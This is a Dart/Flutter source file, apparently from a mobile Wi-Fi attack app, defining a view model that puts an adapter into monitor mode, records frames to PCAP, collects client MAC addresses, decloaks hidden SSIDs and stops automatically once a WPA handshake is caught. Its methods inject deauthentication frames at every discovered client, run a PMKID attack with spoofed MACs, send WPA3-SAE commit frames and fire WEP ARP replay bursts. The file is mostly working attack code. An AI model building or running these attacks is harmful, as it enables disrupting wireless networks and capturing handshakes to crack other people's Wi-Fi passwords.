import 'dart:async';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import '../native_bridge.dart';
import '../utils/pcap_writer.dart';
import '../utils/packet_parser.dart';

class TargetViewModel extends ChangeNotifier {
  final ScanResult target;
  
  bool _monitorActive = false;
  bool _captureActive = false;
  int _capturedCount = 0;
  final List<String> _logs = [];
  BackendInfo? _backendInfo;
  String? _errorMessage;

  final Set<String> _clients = {};
  PcapWriter? _pcapWriter;
  bool _handshakeCaptured = false;
  String _myRandomMac = '00:11:22:33:44:55';
  String? _decloakedSsid;

  StreamSubscription? _captureSub;

  bool get monitorActive => _monitorActive;
  bool get captureActive => _captureActive;
  int get capturedCount => _capturedCount;
  List<String> get logs => _logs;
  BackendInfo? get backendInfo => _backendInfo;
  String? get errorMessage => _errorMessage;
  Set<String> get clients => _clients;
  bool get handshakeCaptured => _handshakeCaptured;
  String get displaySsid => _decloakedSsid ?? (target.ssid.isEmpty ? '<HIDDEN_SSID>' : target.ssid);

  TargetViewModel(this.target) {
    _initTarget();
  }

  Future<void> _initTarget() async {
    _backendInfo = await NativeBridge.getBackendInfo();
    notifyListeners();

    _captureSub = NativeBridge.capturedFrames.listen((frame) async {
      _capturedCount++;
      
      // Save to PCAP
      if (_pcapWriter != null) {
        await _pcapWriter!.writePacket(frame.frameData);
      }

      // Parse for Clients
      final clientMac = PacketParser.extractClientMac(frame.frameData, target.bssid);
      if (clientMac != null && !_clients.contains(clientMac)) {
        _clients.add(clientMac);
        addLog('FOUND CLIENT: $clientMac');
      }

      // Parse for Handshakes (EAPOL)
      if (!_handshakeCaptured && PacketParser.hasEapol(frame.frameData)) {
        _handshakeCaptured = true;
        addLog('*** WPA HANDSHAKE CAPTURED ***');
        notifyListeners();
        // Automatically stop capturing once we have the handshake
        await toggleCapture(); 
      }

      // Parse for Hidden SSID Decloaking
      if ((target.ssid.isEmpty || target.ssid.contains('<HIDDEN')) && _decloakedSsid == null) {
        final foundSsid = PacketParser.extractSsidForTarget(frame.frameData, target.bssid);
        if (foundSsid != null && foundSsid.isNotEmpty) {
          _decloakedSsid = foundSsid;
          addLog('*** SSID DECLOAKED: $foundSsid ***');
          notifyListeners();
        }
      }

      if (_capturedCount % 100 == 0) {
        addLog('CAPTURED $_capturedCount FRAMES [CH: ${frame.channel}]');
      }
      notifyListeners();
    });
  }

  void addLog(String msg) {
    _logs.insert(0, '[${DateTime.now().toIso8601String().substring(11, 19)}] $msg');
    if (_logs.length > 50) _logs.removeLast();
    notifyListeners();
  }
  
  void clearError() {
    _errorMessage = null;
    notifyListeners();
  }

  Future<void> toggleMonitorMode() async {
    if (_monitorActive) {
      if (_captureActive) await toggleCapture();
      await NativeBridge.stopMonitorMode();
      addLog('MONITOR MODE: OFF');
      _monitorActive = false;
      notifyListeners();
    } else {
      if (_backendInfo?.dongleConnected != true) {
        _errorMessage = 'DONGLE REQUIRED FOR MONITOR MODE';
        notifyListeners();
        return;
      }
      
      addLog('STARTING MONITOR MODE...');
      final ok = await NativeBridge.startMonitorMode();
      if (ok) {
        await NativeBridge.setChannel(target.channel);
        addLog('MONITOR MODE: ON (CH ${target.channel})');
        _monitorActive = true;
      } else {
        addLog('ERROR: FAILED TO START MONITOR MODE');
      }
      notifyListeners();
    }
  }

  Future<void> toggleCapture() async {
    if (!_monitorActive) {
      _errorMessage = 'MONITOR MODE MUST BE ACTIVE';
      notifyListeners();
      return;
    }
    
    if (_captureActive) {
      await NativeBridge.stopCapture();
      if (_pcapWriter != null) {
        await _pcapWriter!.close();
        addLog('PCAP SAVED: ${_pcapWriter!.file.path}');
        _pcapWriter = null;
      }
      addLog('CAPTURE: STOPPED');
      _captureActive = false;
    } else {
      addLog('STARTING RAW CAPTURE...');
      try {
        _pcapWriter = await PcapWriter.create(target.bssid);
        addLog('PCAP FILE OPENED');
      } catch (e) {
        addLog('FAILED TO OPEN PCAP: $e');
      }
      
      final ok = await NativeBridge.startCapture();
      if (ok) {
        addLog('CAPTURE: RUNNING');
        _captureActive = true;
      } else {
        addLog('ERROR: FAILED TO START CAPTURE');
      }
    }
    notifyListeners();
  }
  
  Future<void> injectDeauth() async {
     if (!_monitorActive) {
      _errorMessage = 'MONITOR MODE MUST BE ACTIVE';
      notifyListeners();
      return;
    }
    if (_clients.isEmpty) {
      addLog('NO CLIENTS FOUND YET - CANNOT INJECT');
      return;
    }
    
    addLog('STARTING DEAUTH ATTACK ON ${_clients.length} CLIENTS');
    int successCount = 0;
    for (final client in _clients) {
      final frame = PacketParser.craftDeauth(target.bssid, client);
      final ok = await NativeBridge.injectFrame(frame);
      if (ok) successCount++;
    }
    
    addLog('INJECTION: SENT $successCount/${_clients.length} DEAUTH FRAMES');
  }

  Future<void> injectPmkidAttack() async {
    if (!_monitorActive) {
      _errorMessage = 'MONITOR MODE MUST BE ACTIVE';
      notifyListeners();
      return;
    }
    
    // Generate a new random MAC for each attack to avoid getting ignored
    final randMac = List.generate(6, (index) => (DateTime.now().microsecondsSinceEpoch % 255).toRadixString(16).padLeft(2, '0')).join(':');
    _myRandomMac = randMac;

    addLog('STARTING PMKID ATTACK (SPOOFED MAC: $_myRandomMac)');
    
    // 1. Send Authentication Frame
    final authFrame = PacketParser.craftAuth(target.bssid, _myRandomMac);
    await NativeBridge.injectFrame(authFrame);
    addLog('PMKID: SENT AUTHENTICATION');
    
    // Small delay to let AP process
    await Future.delayed(const Duration(milliseconds: 100));
    
    // 2. Send Association Request
    final assocFrame = PacketParser.craftAssocReq(target.bssid, _myRandomMac, target.ssid);
    final ok = await NativeBridge.injectFrame(assocFrame);
    
    if (ok) {
      addLog('PMKID: SENT ASSOC REQ (WAITING FOR EAPOL M1...)');
    } else {
      addLog('PMKID: INJECTION FAILED');
    }
  }

  Future<void> injectWpa3SaeAttack() async {
    if (!_monitorActive) {
      _errorMessage = 'MONITOR MODE MUST BE ACTIVE';
      notifyListeners();
      return;
    }

    addLog('STARTING 2026 WPA3-SAE COMMIT AUDIT...');
    final frame = PacketParser.craftAuth(target.bssid, _myRandomMac);
    // Overwrite Auth Algo to 3 (SAE)
    frame[24] = 0x03;
    frame[25] = 0x00;

    final ok = await NativeBridge.injectFrame(frame);
    if (ok) {
      addLog('WPA3-SAE: COMMIT FRAME INJECTED (AUDITING DRAGONBLOOD TIMING...)');
    } else {
      addLog('WPA3-SAE: INJECTION FAILED');
    }
  }

  Future<void> injectWepArpReplay() async {
    if (!_monitorActive) {
      _errorMessage = 'MONITOR MODE MUST BE ACTIVE';
      notifyListeners();
      return;
    }

    addLog('STARTING WEP ARP REPLAY INJECTION...');
    final dummyArp = Uint8List.fromList([0x08, 0x41, 0x02, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    final ok = await NativeBridge.injectFrame(dummyArp);
    if (ok) {
      addLog('WEP ARP: REPLAY BURST SENT (GENERATING IVs...)');
    } else {
      addLog('WEP ARP: INJECTION FAILED');
    }
  }

  @override
  void dispose() {
    _pcapWriter?.close();
    NativeBridge.stopCapture();
    NativeBridge.stopMonitorMode();
    _captureSub?.cancel();
    super.dispose();
  }
}
